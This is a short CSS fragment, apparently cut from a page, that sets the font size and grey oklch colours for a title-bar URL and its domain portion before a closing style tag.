  .pd-titlebar-url {
    font-size: 0.6875rem;
    color: oklch(0.45 0 0);
  }
  .pd-titlebar-url .pd-domain {
    color: oklch(0.65 0 0);
  }
</style>
